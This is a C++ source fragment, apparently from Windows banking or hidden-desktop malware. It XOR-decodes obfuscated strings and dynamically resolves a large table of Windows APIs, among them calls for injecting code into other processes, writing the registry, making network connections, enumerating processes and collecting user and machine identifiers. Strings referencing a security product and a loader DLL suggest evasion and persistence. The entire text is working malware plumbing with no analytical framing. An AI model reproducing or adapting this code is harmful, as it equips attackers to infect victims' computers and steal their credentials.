//   Strs::ie3  = UnEnc("\x006E\x0045\x0054\x003B\x0025\x0048\x002D\x0009\x0030\x003B\x0022\x0020\x0025\x0033\x007D\x003F\x0028\x002B\x002D\x0038\x002A\x0057\x003E\x006C\x003A\x0043\x0035\x0022\x007A\x0074\x0079\x003F\x003D\x0039\x002B\x0021\x0046\x007B\x005B\x0022\x0056\x002A\x004C\x0051\x0022\x0039\x001B\x002E\x0027\x005D\x0022\x007A\x000E\x0064\x003C\x0037\x0023\x005C\x0041\x0020\x006A", "R67IL8Y7GRLDJDSSGHLLC8PBR1PDZIYHTWON1U7M5K88MW5FU8DA2KOTQ51TT", 61);
//   Strs::ie4  = UnEnc("\x001F\x0026\x0043\x0057\x0037\x003A\x0032\x002D\x0005\x005D\x0039\x0039\x005C\x0019\x0053\x0057\x0036\x0036\x0050", "VH72ETWYF1VJ9Q29RZ5", 19);
//   Strs::ie5  = UnEnc("\x007C\x0024\x0027\x0054\x0034\x0036\x0035\x003D\x0019\x0041\x0052\x0047\x004A\x000A\x0053\x003E\x0022\x0003\x0030\x0029\x002A\x0026\x0030\x0032\x0024\x0036", "5JS1FXPIH4753N2JCBFHCJQPHS", 26);
//   Strs::ie6  = UnEnc("\x0079\x0046\x0040\x0027\x001B\x0049\x0022\x0058\x000B\x002F\x0032\x0024\x0057\x0035\x002E\x001C", "124WT9G6YJCQ2FZK", 16);
//   Strs::ie7  = UnEnc("\x0019\x005A\x003D\x0050\x0043\x005B\x002D\x0033\x0019\x0057\x0022\x003C\x0057\x0034\x0047\x0013", "P4I515HGZ8LR2W3D", 16);
//   Strs::ie8  = UnEnc("\x001C\x002C\x0042\x0027\x001C\x0033\x0025\x0053\x0008\x0052\x002B\x0026\x002D\x0024\x003D\x0016", "TX6WOVK7Z7ZSHWIA", 16);
//   Strs::ie9  = UnEnc("\x001A\x005F\x0047\x0032\x003A\x0023\x0055\x0041\x0004\x003D\x0056\x0032\x001E\x0030\x0028\x0026", "S13WHM05VX7VXYDC", 16);
//   Strs::ie10 = UnEnc("\x0018\x0056\x0042\x0023\x003B\x002D\x0053\x0040\x0006\x002E\x0027\x0050\x0001\x0030\x0055\x0026\x001F\x0033\x006F", "Q86FIC64TKF4GY9CZK8", 19);
//   Strs::ie11 = UnEnc("\x000B\x005C\x003C\x0053\x0035\x0058\x0024\x0036\x0067\x002A\x0033\x003E\x0027\x0075\x003E\x002F\x002C", "B2H6G6AB0XZJB3WCI", 17);

//   Strs::exp1  = UnEnc("\x007F\x0025\x0042\x0020\x0051\x0058\x0030\x0056\x006D", "ZD2P59D7H", 9);
 //  Strs::exp2  = UnEnc("\x0010\x0029\x006A\x007C\x0047\x0069\x006B\x0029\x001F\x006F\x003A\x006D\x0059\x0027\x0021", "5Z6Y45NZCJIC0IH", 15);
 //  Strs::exp3  = UnEnc("\x000F\x0029\x003D\x005A\x002D\x0029\x0023", "BFG3AEB", 7);
 //  Strs::exp4  = UnEnc("\x0012\x003F\x0042\x002B\x0031\x003C\x002C", "TV0NWST", 7);
 //  Strs::exp5  = UnEnc("\x0017\x0041\x002A\x005F\x0050\x002E\x002E\x0036", "G3E99BKE", 8);
 //  Strs::exp6  = UnEnc("\x0013\x0041\x005C\x0050\x0025\x005D\x002B", "C336L1N", 7);
 //  Strs::exp7  = UnEnc("\x0064\x0027\x004D\x005C", "4F94", 4);
 //  Strs::exp8  = UnEnc("\x0070\x003C\x0006\x0016\x0039\x006A\x0066\x0047\x001B\x0069\x0044\x000E\x006F\x0046\x001B\x0013\x0022\x006B\x002E\x0043", "UOZ3J6C4GL7RJ5G6QED0", 20);
//   Strs::exp9  = UnEnc("\x0037\x0045\x0053\x0022\x003E", "G76DM", 5);
 //  Strs::exp10 = UnEnc("\x002F\x0020\x0046\x003D\x0028\x0043\x003D\x0060\x0059\x0043\x0032\x0021\x006F\x0046\x0033\x0052\x003E\x006B\x0056\x002B\x002C\x0037\x002D\x0023\x0051", "AE2JG1VN17FQA5C6GE3EMUAF5", 25);
//   Strs::exp11 = UnEnc("\x0054\x0028\x002C\x003D\x002A\x003D\x0020\x0079\x0025\x0028\x0050\x0038\x007B\x0033\x0030\x0020\x002B\x0026\x0052\x006C\x0031\x0024\x003D\x002D\x0040\x0035\x0053\x0036\x004C", "6ZCJYXRWQI2KUAUMDR7BPQIB3A2D8", 29);
//   Strs::exp12 = UnEnc("\x0034\x0022\x0021\x002A\x0010\x003A\x0030\x0031\x0022\x006C\x0069\x0036\x0051\x0020\x0020\x0024\x0025\x003C\x006B\x0022\x0045\x003D\x0033\x006A\x0037\x0020\x0035\x0028\x006F\x0034\x0036\x0055\x002C\x0034\x0034\x0056\x0077\x0021\x0074\x001D\x0062\x0011\x0015\x006F\x003E\x002F\x0039\x0045\x0032\x0019\x007C\x0042\x0053\x0041\x0034\x0054\x003C\x001E\x0024\x004A\x0056\x0033\x007B\x007A\x003E\x0035\x003E\x003F\x002B\x0046\x003D\x006F\x0038\x003A\x0044\x0048\x0067\x002A\x0020\x0054\x004D\x007A\x0051\x0024\x002B\x0028\x002A\x0031\x0035\x0077\x0039\x006A\x0061\x0064\x0017\x005E\x002D\x0021\x004B\x002D\x006D\x0075\x003F\x003B\x0033\x0035\x005D\x003E\x001A\x0039\x0021\x003F\x0033\x001B\x0067\x0024\x003F\x003D\x0039\x0029\x0039\x005B\x001E\x0038\x0024\x0043\x0047\x0067\x0023\x0041\x0033\x004F\x0074\x002C\x0039\x0030\x0052\x0028\x0020\x0021\x006E\x0018\x0070\x002F\x0027\x0036\x0037\x002F\x006D\x0062\x0044\x004E\x004D\x0041\x0052\x003C\x0007\x003E\x003F\x002C\x002E\x0072\x0014\x002F\x0024\x0038\x004E\x003F\x0022\x002A\x007D\x0023\x0025\x0028\x0047\x007E\x003E\x0036\x0027\x0035\x0047\x003C\x006B\x0051\x0026\x0020\x0058\x0044\x0038\x0028\x0041\x003A\x0013\x001A\x0016\x0030\x0059\x002F\x0024\x0031\x0019\x0009\x004E\x005B\x0033\x0024\x005C\x0028\x0067\x0022\x0031\x0020\x0023\x007F\x006D\x0036\x0024\x0029\x0044\x0031\x003C\x0031\x0017\x0043\x0052\x0024\x0046\x0066\x003C\x002C\x003F\x0026\x0041\x0055\x0017\x0023\x0023\x002D\x003A\x0045\x0021\x0028\x004A\x0040\x0069\x006B\x0068\x0069\x0072\x002B\x0020\x005E\x003A\x0033\x001D\x0062\x003F\x004C\x0022\x0032\x0054\x0043\x0012\x0040\x0033\x0056\x002F\x0066\x007A\x0029\x005E\x004E\x007B\x0053\x003B\x0022\x0021\x0025\x0045\x0077\x0051\x001E\x0054\x0028\x003B\x0038\x0023\x0027\x0050\x002F\x006B\x007D\x0063\x0020\x0037\x0047\x0053\x0060\x000F\x0040\x005A\x0040\x0021\x0021\x003D\x001A\x0039\x0039\x0020\x0029\x007D\x0075\x0022\x0033\x003F\x0024\x0030\x003F\x007D\x002D\x0050\x005B\x0036\x0021\x0020\x0020\x0052\x0035\x005A\x0036\x003D\x001B\x0028\x0026\x002A\x0020\x002B\x003B\x0033\x0020\x0073\x0076\x0067\x0025\x0028\x0022\x0026\x007C\x0074", "AQDXOJBTDDKX4TWKWWEJ1ICDDPQQAQX4NXQ2YWG0S39OXNU6W0GOY4G1NAT83USXPPJHD4VAPN08IYP04T4JJJFTQYOYCH78LM8HDN21FF8LEISZU3EJZINFK00PP77IP1W6ZIWQ0DEEL4PIFZDJDYID827NXNMIHZ6MVW9LGXSWDJ4PLSJZ3YE0ST77LI3N166V8CWT02CQFW9Z8RCEEWOTVF3BYC973F5HNIRI509BVYU6UI84GYJERMA2IV4Y2FWA11M0A3INXN86U7RPDF1E500AHYAK5KIQCTE26I4MP5RDOEIKEOUWNRFABLSL38SMER3A3YS5LOYAIWVDQZGQZWCUO", 349);
//   Strs::exp13 = UnEnc("\x0017\x005E\x0030\x002E\x0024\x0035\x0020\x002B\x001A\x0075\x005E\x0028\x003A\x003D\x0023\x0059\x003C\x003F\x0065\x007B\x0028\x0045\x002A\x0042\x0021\x0051\x0030\x0011\x0007\x002F\x0023\x003C\x0025\x0024\x003F\x0044\x006B\x000B\x0052\x005D\x0026", "D1VZSTRNF87KHRP6ZK92F1O0O4D1BWSPJVZ67F34H", 41);
//   Strs::exp14 = UnEnc("\x0003\x0025\x003A\x0009\x0041\x0026\x002A\x0077\x0027\x002E\x003B\x0037\x0059", "WDXY3II0UALC1", 13);
 //  Strs::exp15 = UnEnc("\x0019\x0023\x002B\x0040\x003B\x0039\x0022\x0055\x0011\x001E\x0038\x0031\x0033\x0039\x0041\x003B\x005E\x0020\x000E\x0012\x003F\x003D\x003D\x005F\x0035\x0025\x000A\x0076\x0034\x0023\x0025\x0022\x0023\x0026\x001B\x002B\x0026\x0037\x005D\x0029\x0021\x000D\x0002\x0038\x0033\x0022\x0040\x0036\x0034\x003C\x0077\x0002\x0051\x004C\x0032\x0058\x0036\x0030\x0041\x0006\x0019\x003A\x0034\x0050\x0046\x0017\x0075", "JLM4LXP0MSQRAV2T8TREVSY0BVV5AQWGMRMNTD4FOQKVGG2XQHWQ48F1XW2ZCUZ55KF", 67);
 //  Strs::exp16 = UnEnc("\x0066\x007F\x007F\x0009", "TJO9", 4);
 //  Strs::exp17 = UnEnc("\x0015\x0077\x0060\x003E\x002C\x003A\x0025\x0036\x0059\x0057\x0015\x0027\x0047\x0040\x0036\x007E\x006F\x0061\x007B\x002F\x0044\x002E\x0068\x0037\x0044\x0055\x0029\x0067\x0059\x0024\x002C\x006E\x006F\x0065\x0055\x0058\x0020\x0028\x0020\x003F\x0030\x006E\x0046\x0043\x002D\x0025", "5ZMZEIDT528O34FLOLVZ7KED41PZ6BJNBH11SIBSUC76DF", 46);
 //  Strs::exp18 = UnEnc("\x0075\x0033\x0055\x0058\x0045\x002D\x0009\x0028\x002C\x0036\x0030\x0039\x0046\x0007\x005D\x003A\x003D\x0046\x003A\x0037\x0022\x0001", "6A091HYZCUUJ5N3NX4TVNV", 22);
 //  Strs::exp19 = UnEnc("\x000A\x0021\x0063\x0034\x0024\x0037\x0020\x0056\x003A\x002D\x005D\x0014\x005B\x002B\x005C\x0075\x002A\x002C\x0037\x0028\x0034", "DN3FKCE5NH9Y4O97KBYMF", 21);

   Strs::hd1   = UnEnc("\x0064\x007B\x0078\x007A\x006E\x0062", "GHJMXZ", 6);
   Strs::hd2   = UnEnc("\x001B\x003D\x0031\x0020\x0037\x005E\x0027\x0004\x007F\x0068\x0033\x004E\x0032\x0075\x003B\x0020\x0028\x0026\x0024\x0060\x0062\x0061\x0054\x0038\x003E\x001A\x0061\x0067\x0007", "GODNS2K7MFV6WUHHMJHSPO0TR6BQ6", 29);
   Strs::hd3   = UnEnc("\x0014\x003A\x0055\x002C\x003A\x0059\x0023\x002F\x0068\x001F\x005F\x0037\x0023\x0038\x0042\x0036\x0020\x0037\x006E\x006F\x0051\x005A\x005D\x0029\x0032\x0038\x006E\x001A\x0021\x0047\x0024\x0054\x005A\x0035\x0010\x0033\x0040\x0039\x0023\x0038\x005E\x006B\x0016\x0049\x003C\x0055\x0057\x0040\x005D\x0047\x0011\x0075\x002E\x0025\x0059\x0023\x0036\x003D\x0037", "GU3XM8QJ4R6TQW1YFC28849FEK2YT5V14AFV2JJW07S1L98285M4JS8MUXS", 59);
   Strs::hd4   = UnEnc("\x0017\x0027\x0041\x005B\x005B\x0057\x0037\x001D\x003D\x003E\x002A\x007A\x0050\x0044\x0023\x0024", "CF2096EZQQG652FH", 16);
   Strs::hd5   = UnEnc("\x0032\x003E\x0026\x0052\x002F\x0021\x0024\x0029\x0077\x003A\x005F\x003A", "BLI4FMAZYS1S", 12);
   Strs::hd6   = UnEnc("\x0060\x0033\x0041\x002E\x0023\x0058\x0024\x0034\x0018", "MC3AE1HQ8", 9);
   Strs::hd7   = UnEnc("\x0014\x0013\x005A\x0028\x002D\x003E\x0029\x006E\x007B\x003A\x0030\x002B\x0026\x0053\x001D", "HT5GJRL28RBDK6A", 15);
   Strs::hd8   = UnEnc("\x002E\x005E\x002A\x0074\x0023\x003C\x0026\x0071\x006A\x0034\x006D\x003C\x002C\x0027\x0040\x0031\x0076", "M3NZFDCQEWMOXF2EV", 17);
   Strs::hd9   = UnEnc("\x007A\x0067\x001E\x005C\x0022\x0075\x0046\x0054\x0037\x0052\x0038\x002D\x0022\x006F\x006F\x006B\x0052\x0035\x0020\x0020\x0025\x0066\x005B\x002A\x0069\x0043\x0035\x0059\x0027\x003A\x0037\x003F\x0060\x003B\x0021\x0020\x0064\x0065\x0014\x0022\x003B\x0047\x0030\x0025\x0021\x002A\x0062\x007B\x002F\x0067\x0055\x0021\x0038\x0043\x0064\x0062\x0062\x003D\x0033\x0024\x0024\x005A\x005E\x0027\x0067\x0033\x0029\x003F\x0061\x006C\x006E\x0032\x0033\x0034\x0057\x0035\x0058\x003F\x001F\x003D\x007F\x0028\x0066\x0002\x0013\x006A\x0077\x0022\x003E\x005C\x002A\x0062\x0037\x002F\x0036\x0035\x006E\x0034\x005F\x0041\x000D", "ZJ32MX55Y6ZBZOBF3YLORK5ED0T7CXXGMQNBDH9FR4QGMOOHKJ4QQ0DOOYZWE82BJTYJAACVZG6W4Z2YLLW33GZWM9XOSNBTCP630", 101);
   Strs::hd10  = UnEnc("\x0010\x0034\x002E\x003A\x0069\x0074\x002A\x0047\x0030\x0009", "EGKHI0K3QU", 10);
   Strs::hd11  = UnEnc("\x0006\x007B\x002E\x0031\x005B\x0020\x0054\x0029\x0018\x0075\x002B\x0045\x0027\x0028\x0037\x003C\x0011", "Z6AK2L8HD3B7BNXDM", 17);
   Strs::hd12  = UnEnc("\x000F\x003D\x0007\x002A\x005E\x0059\x004C\x002E\x0030\x0029\x006A", "FNUO288GFLW", 11);
   Strs::hd13  = UnEnc("\x0006\x0031\x0024\x005B\x0008", "VPP35", 5);
   Strs::hd14  = UnEnc("\x0070\x001A\x003C\x003D\x006E\x003B\x002D\x0029\x0026\x0046\x0024\x0079\x0065\x0036\x0044\x003B\x0020\x0026\x002A\x0034\x0016", "P7RRCIHDI2AYHF6TFOFQ6", 21);

   //Strs::infoRequest      = UnEnc("\x002F\x0058\x005E\x002C\x0038\x007D\x005D\x0031\x0072\x003C\x0032\x006C\x0027\x002A\x0075\x0023\x002A\x006F\x0045\x003B\x0077\x0034\x0045\x0012\x002F\x0045\x001C\x0034", "F68CDX9MWXNICVPGVJ6GRG97K99P", 28);
  // Strs::pipeName         = UnEnc("\x0018\x000C\x006C\x0016\x003E\x0051\x003B\x0027\x000F\x0075\x004A", "DPBJN8KBSP9", 11);  
  // Strs::open             = UnEnc("\x0039\x0038\x0055\x0039", "VH0W", 4);
 //  Strs::shell_TrayWnd    = UnEnc("\x0015\x003F\x0035\x0029\x0038\x000D\x0019\x0026\x0024\x0033\x001C\x003E\x005C", "FWPETRMTEJKP8", 13);
 //  Strs::verclsidExe      = UnEnc("\x0040\x0024\x0040\x0027\x0034\x0026\x0023\x0023\x0079\x0021\x004C\x0021", "6A2DXUJGWD4D", 12);
 //  Strs::dll32cachePrefix = UnEnc("\x007F\x007C", "LN", 2);
 //  Strs::dll64cachePrefix = UnEnc("\x006E\x0073", "XG", 2);
  // Strs::loaderDllName    = UnEnc("\x0029\x0023\x0051\x005C\x0031\x001A\x002F\x0058\x0059", "JK80U4K45", 9);
 //  Strs::zoneId           = UnEnc("\x006A\x006D\x005F\x005B\x0053\x006F\x000D\x0030\x0029\x0028\x0027\x0031\x0050\x005E\x0032\x0020", "P7056ADTLFSX67WR", 16);
  // Strs::trusteer         = UnEnc("\x0004\x0026\x0026\x0026\x0035\x002C\x0021\x0028", "PTSUAIDZ", 8);

   Funcs::pLoadLibraryA = (Types::T_LoadLibrary) GetProcAddress(LoadLibraryA(Strs::kernel32), Strs::loadLibraryA);
   HMODULE hUser32 = Funcs::pLoadLibraryA(Strs::user32);
   HMODULE hKernel32 = Funcs::pLoadLibraryA(Strs::kernel32);
   HMODULE hMsvcrt   = Funcs::pLoadLibraryA(Strs::msvcrt);
   HMODULE hNtdll    = Funcs::pLoadLibraryA(Strs::ntdll);
   HMODULE hShlwapi  = Funcs::pLoadLibraryA(Strs::shlwapi);
   HMODULE hShell32  = Funcs::pLoadLibraryA(Strs::shell32);
   HMODULE hSecur32  = Funcs::pLoadLibraryA(Strs::secur32);
   HMODULE hAdvapi32 = Funcs::pLoadLibraryA(Strs::advapi32);
   HMODULE hWs2_32   = Funcs::pLoadLibraryA(Strs::ws2_32);
   HMODULE hVersion  = Funcs::pLoadLibraryA(Strs::version);
   HMODULE hPsapi    = Funcs::pLoadLibraryA(Strs::psapi);
   HMODULE hWininet  = Funcs::pLoadLibraryA(Strs::wininet);
   HMODULE hGdi32    = Funcs::pLoadLibraryA(Strs::gdi32);
                                           
   Funcs::pGetProcAddress                 = (Types::T_GetProcAddress)                 GetProcAddress(hKernel32, Strs::getProcAddress);
   Funcs::pMessageBoxA                    = (Types::T_MessageBox)                     Funcs::pGetProcAddress(hUser32, Strs::messageBoxA);
   Funcs::pGetWindowsDirectoryA           = (Types::T_GetWindowsDirectory)            Funcs::pGetProcAddress(hKernel32, Strs::getWindowsDirectoryA);
   Funcs::pWideCharToMultiByte            = (Types::T_WideCharToMultiByte)            Funcs::pGetProcAddress(hKernel32, Strs::wideCharToMultiByte);
   Funcs::pLocalAlloc                     = (Types::T_LocalAlloc)                     Funcs::pGetProcAddress(hKernel32, Strs::localAlloc);
   Funcs::pWsprintfA                      = (Types::T_wsprintf)                       Funcs::pGetProcAddress(hUser32, Strs::wsprintfA);
   Funcs::pMultiByteToWideChar            = (Types::T_MultiByteToWideChar)            Funcs::pGetProcAddress(hKernel32, Strs::multiByteToWideChar);
   Funcs::pMalloc                         = (Types::T_malloc)                         Funcs::pGetProcAddress(hMsvcrt, Strs::malloc);
   Funcs::pFree                           = (Types::T_free)                           Funcs::pGetProcAddress(hMsvcrt, Strs::free);
   Funcs::pVirtualAllocEx                 = (Types::T_VirtualAllocEx)                 Funcs::pGetProcAddress(hKernel32, Strs::virtualAllocEx);
   Funcs::pWriteProcessMemory             = (Types::T_WriteProcessMemory)             Funcs::pGetProcAddress(hKernel32, Strs::writeProcessMemory);
   Funcs::pCreateRemoteThread             = (Types::T_CreateRemoteThread)             Funcs::pGetProcAddress(hKernel32, Strs::createRemoteThread);
   Funcs::pPathRemoveFileSpecA            = (Types::T_PathRemoveFileSpec)             Funcs::pGetProcAddress(hShlwapi, Strs::pathRemoveFileSpecA);
   Funcs::pGetModuleFileNameA             = (Types::T_GetModuleFileName)              Funcs::pGetProcAddress(hKernel32, Strs::getModuleFileNameA);
   Funcs::pPathFindFileNameA              = (Types::T_PathFindFileName)               Funcs::pGetProcAddress(hShlwapi, Strs::pathFindFileNameA);
   Funcs::pStrncmp                        = (Types::T_strncmp)                        Funcs::pGetProcAddress(hMsvcrt, Strs::strncmp);
   Funcs::pStrnicmp                       = (Types::T_strncmp)                        Funcs::pGetProcAddress(hMsvcrt, Strs::strnicmp);
   Funcs::pLstrlenA                       = (Types::T_lstrlen)                        Funcs::pGetProcAddress(hKernel32, Strs::lstrlenA);
   Funcs::pExitProcess                    = (Types::T_ExitProcess)                    Funcs::pGetProcAddress(hKernel32, Strs::exitProcess);
   Funcs::pSHGetFolderPathA               = (Types::T_SHGetFolderPath)                Funcs::pGetProcAddress(hShell32, Strs::shGetFolderPathA);
   Funcs::pLstrcpyA                       = (Types::T_lstrcpy)                        Funcs::pGetProcAddress(hKernel32, Strs::lstrcpyA);
   Funcs::pLstrcatA                       = (Types::T_lstrcat)                        Funcs::pGetProcAddress(hKernel32, Strs::lstrcatA);
   Funcs::pCopyFileA                      = (Types::T_CopyFile)                       Funcs::pGetProcAddress(hKernel32, Strs::copyFileA);
   Funcs::pGetVolumeInformationA          = (Types::T_GetVolumeInformation)           Funcs::pGetProcAddress(hKernel32, Strs::getVolumeInformationA);
   Funcs::pGetUserNameExA                 = (Types::T_GetUserNameEx)                  Funcs::pGetProcAddress(hSecur32,  Strs::getUserNameExA);
   Funcs::pLookupAccountNameA             = (Types::T_LookupAccountName)              Funcs::pGetProcAddress(hAdvapi32, Strs::lookupAccountNameA);
   Funcs::pConvertSidToStringSidA         = (Types::T_ConvertSidToStringSid)          Funcs::pGetProcAddress(hAdvapi32, Strs::convertSidToStringSidA);
   Funcs::pLocalFree                      = (Types::T_LocalFree)                      Funcs::pGetProcAddress(hKernel32, Strs::localFree);
   Funcs::pMemcpy                         = (Types::T_memcpy)                         Funcs::pGetProcAddress(hMsvcrt, Strs::memcpy);
   Funcs::pLstrcmpA                       = (Types::T_lstrcmp)                        Funcs::pGetProcAddress(hKernel32, Strs::lstrcmpA);
   Funcs::pLstrcmpiA                      = (Types::T_lstrcmp)                        Funcs::pGetProcAddress(hKernel32, Strs::lstrcmpiA);
   Funcs::pStrStrA                        = (Types::T_StrStr)                         Funcs::pGetProcAddress(hShlwapi, Strs::strStrA);
   Funcs::pStrStrIA                       = (Types::T_StrStr)                         Funcs::pGetProcAddress(hShlwapi, Strs::strStrIA);
   Funcs::pStrtol                         = (Types::T_strtol)                         Funcs::pGetProcAddress(hMsvcrt, Strs::strtol);
   Funcs::pRealloc                        = (Types::T_realloc)                        Funcs::pGetProcAddress(hMsvcrt, Strs::realloc); 
   Funcs::pWSAStartup                     = (Types::T_WSAStartup)                     Funcs::pGetProcAddress(hWs2_32, Strs::wsaStartup);
   Funcs::pSocket                         = (Types::T_socket)                         Funcs::pGetProcAddress(hWs2_32, Strs::socket);  
   Funcs::pGethostbyname                  = (Types::T_gethostbyname)                  Funcs::pGetProcAddress(hWs2_32, Strs::gethostbyname);     
   Funcs::pHtons                          = (Types::T_htons)                          Funcs::pGetProcAddress(hWs2_32, Strs::htons);
   Funcs::pConnect                        = (Types::T_connect)                        Funcs::pGetProcAddress(hWs2_32, Strs::connect);
   Funcs::pSend                           = (Types::T_send)                           Funcs::pGetProcAddress(hWs2_32, Strs::send);
   Funcs::pRecv                           = (Types::T_recv)                           Funcs::pGetProcAddress(hWs2_32, Strs::recv);
   Funcs::pClosesocket                    = (Types::T_closesocket)                    Funcs::pGetProcAddress(hWs2_32, Strs::closesocket);
   Funcs::pWSACleanup                     = (Types::T_WSACleanup)                     Funcs::pGetProcAddress(hWs2_32, Strs::wsaCleanup);
   Funcs::pMemset                         = (Types::T_memset)                         Funcs::pGetProcAddress(hMsvcrt, Strs::memset);
   Funcs::pSleep                          = (Types::T_Sleep)                          Funcs::pGetProcAddress(hKernel32, Strs::sleep);
   Funcs::pNtOpenKey                      = (Types::T_NtOpenKey)                      Funcs::pGetProcAddress(hNtdll, Strs::ntOpenKey);
   Funcs::pNtSetValueKey                  = (Types::T_NtSetValueKey)                  Funcs::pGetProcAddress(hNtdll, Strs::ntSetValueKey);
   Funcs::pCloseHandle                    = (Types::T_CloseHandle)                    Funcs::pGetProcAddress(hKernel32, Strs::closeHandle);   
   Funcs::pRtlCreateUserThread            = (Types::T_RtlCreateUserThread)            Funcs::pGetProcAddress(hNtdll, Strs::rtlCreateUserThread);
   Funcs::pCreateProcessA                 = (Types::T_CreateProcess)                  Funcs::pGetProcAddress(hKernel32, Strs::createProcessA);
   Funcs::pInitializeCriticalSection      = (Types::T_InitializeCriticalSection)      Funcs::pGetProcAddress(hKernel32, Strs::initializeCriticalSection);
   Funcs::pEnterCriticalSection           = (Types::T_EnterCriticalSection)           Funcs::pGetProcAddress(hKernel32, Strs::enterCriticalSection);
   Funcs::pLeaveCriticalSection           = (Types::T_LeaveCriticalSection)           Funcs::pGetProcAddress(hKernel32, Strs::leaveCriticalSection);
   Funcs::pGetLastError                   = (Types::T_GetLastError)                   Funcs::pGetProcAddress(hKernel32, Strs::getLastError);
   Funcs::pErrno                          = (Types::T_errno)                          Funcs::pGetProcAddress(hMsvcrt, Strs::_errNo);
   Funcs::pTolower                        = (Types::T_tolower)                        Funcs::pGetProcAddress(hMsvcrt, Strs::toLower);
   Funcs::pIsdigit                        = (Types::T_isdigit)                        Funcs::pGetProcAddress(hMsvcrt, Strs::isDigit);
   Funcs::pStrtoul                        = (Types::T_strtoul)                        Funcs::pGetProcAddress(hMsvcrt, Strs::strToul);
   Funcs::pIsxdigit                       = (Types::T_isxdigit)                       Funcs::pGetProcAddress(hMsvcrt, Strs::isXdigit);
   Funcs::pStrtod                         = (Types::T_strtod)                         Funcs::pGetProcAddress(hMsvcrt, Strs::strTod);
   Funcs::pCreateToolhelp32Snapshot       = (Types::T_CreateToolhelp32Snapshot)       Funcs::pGetProcAddress(hKernel32, Strs::createToolhelp32Snapshot);
   Funcs::pProcess32First                 = (Types::T_Process32First)                 Funcs::pGetProcAddress(hKernel32, Strs::process32First);
   Funcs::pProcess32Next                  = (Types::T_Process32Next)                  Funcs::pGetProcAddress(hKernel32, Strs::process32Next);
   Funcs::pStrChrA                        = (Types::T_StrChr)                         Funcs::pGetProcAddress(hShlwapi, Strs::strChrA);
   Funcs::pStrToIntA                      = (Types::T_StrToInt)                       Funcs::pGetProcAddress(hShlwapi, Strs::strToIntA);
   Funcs::pGetModuleHandleA               = (Types::T_GetModuleHandle)                Funcs::pGetProcAddress(hKernel32, Strs::getModuleHandleA);
   Funcs::pGetFileVersionInfoSizeA        = (Types::T_GetFileVersionInfoSize)         Funcs::pGetProcAddress(hVersion, Strs::getFileVersionInfoSizeA);
   Funcs::pGetFileVersionInfoA            = (Types::T_GetFileVersionInfo)             Funcs::pGetProcAddress(hVersion, Strs::getFileVersionInfoA);
   Funcs::pVerQueryValueA                 = (Types::T_VerQueryValue)                  Funcs::pGetProcAddress(hVersion, Strs::verQueryValueA);
   Funcs::pGetModuleInformation           = (Types::T_GetModuleInformation)           Funcs::pGetProcAddress(hPsapi, Strs::getModuleInformation);
   Funcs::pMemcmp                         = (Types::T_memcmp)                         Funcs::pGetProcAddress(hMsvcrt, Strs::memcmp);
   Funcs::pExpandEnvironmentStringsA      = (Types::T_ExpandEnvironmentStrings)       Funcs::pGetProcAddress(hKernel32, Strs::expandEnvironmentStringsA);
   Funcs::pGetPrivateProfileSectionNamesA = (Types::T_GetPrivateProfileSectionNames)  Funcs::pGetProcAddress(hKernel32, Strs::getPrivateProfileSectionNamesA);
   Funcs::pGetPrivateProfileStringA       = (Types::T_GetPrivateProfileString)        Funcs::pGetProcAddress(hKernel32, Strs::getPrivateProfileStringA);
   Funcs::pCreateFileA                    = (Types::T_CreateFile)                     Funcs::pGetProcAddress(hKernel32, Strs::createFileA);  
   Funcs::pReadFile                       = (Types::T_ReadFile)                       Funcs::pGetProcAddress(hKernel32, Strs::readFile);
   Funcs::pWriteFile                      = (Types::T_WriteFile)                      Funcs::pGetProcAddress(hKernel32, Strs::writeFile);
   Funcs::pRegSetValueExA                 = (Types::T_RegSetValueEx)                  Funcs::pGetProcAddress(hAdvapi32, Strs::regSetValueExA);   
   Funcs::pRegOpenKeyExA                  = (Types::T_RegOpenKeyEx)                   Funcs::pGetProcAddress(hAdvapi32, Strs::regOpenKeyExA);
   Funcs::pRegCloseKey                    = (Types::T_RegCloseKey)                    Funcs::pGetProcAddress(hAdvapi32, Strs::regCloseKey);
   Funcs::pGetFileSize                    = (Types::T_GetFileSize)                    Funcs::pGetProcAddress(hKernel32, Strs::getFileSize);
   Funcs::pResumeThread                   = (Types::T_ResumeThread)                   Funcs::pGetProcAddress(hKernel32, Strs::resumeThread);
   Funcs::pIsWow64Process                 = (Types::T_IsWow64Process)                 Funcs::pGetProcAddress(hKernel32, Strs::isWow64Process);
   Funcs::pGetNativeSystemInfo            = (Types::T_GetNativeSystemInfo)            Funcs::pGetProcAddress(hKernel32, Strs::getNativeSystemInfo);
   Funcs::pOpenProcess                    = (Types::T_OpenProcess)                    Funcs::pGetProcAddress(hKernel32, Strs::openProcess);
   Funcs::pCreateThread                   = (Types::T_CreateThread)                   Funcs::pGetProcAddress(hKernel32, Strs::createThread);
   Funcs::pGetUserNameW                   = (Types::T_GetUserName)                    Funcs::pGetProcAddress(hAdvapi32, Strs::getUserNameW);
   Funcs::pGetComputerNameW               = (Types::T_GetComputerName)                Funcs::pGetProcAddress(hKernel32, Strs::getComputerNameW);
   Funcs::pGetVersionExA                  = (Types::T_GetVersionEx)                   Funcs::pGetProcAddress(hKernel32, Strs::getVersionExA);
   Funcs::pCreateNamedPipeA               = (Types::T_CreateNamedPipe)                Funcs::pGetProcAddress(hKernel32, Strs::createNamedPipeA);
   Funcs::pConnectNamedPipe               = (Types::T_ConnectNamedPipe)               Funcs::pGetProcAddress(hKernel32, Strs::connectNamedPipe);
   Funcs::pDisconnectNamedPipe            = (Types::T_DisconnectNamedPipe)            Funcs::pGetProcAddress(hKernel32, Strs::disconnectNamedPipe);
   Funcs::pInternetCrackUrlA              = (Types::T_InternetCrackUrl)               Funcs::pGetProcAddress(hWininet,  Strs::internetCrackUrlA);
   Funcs::pGetTempPathA                   = (Types::T_GetTempPath)                    Funcs::pGetProcAddress(hKernel32, Strs::getTempPathA);
   Funcs::pGetTempFileNameA               = (Types::T_GetTempFileName)                Funcs::pGetProcAddress(hKernel32, Strs::getTempFileNameA);
   Funcs::pShellExecuteA                  = (Types::T_ShellExecute)                   Funcs::pGetProcAddress(hShell32,  Strs::shellExecuteA);
   Funcs::pIoctlsocket                    = (Types::T_ioctlsocket)                    Funcs::pGetProcAddress(hWs2_32, Strs::ioctlsocket);
   Funcs::pNtohs                          = (Types::T_ntohs)                          Funcs::pGetProcAddress(hWs2_32, Strs::ntohs);
   Funcs::pCreateMutexA                   = (Types::T_CreateMutex)                    Funcs::pGetProcAddress(hKernel32, Strs::createMutexA);
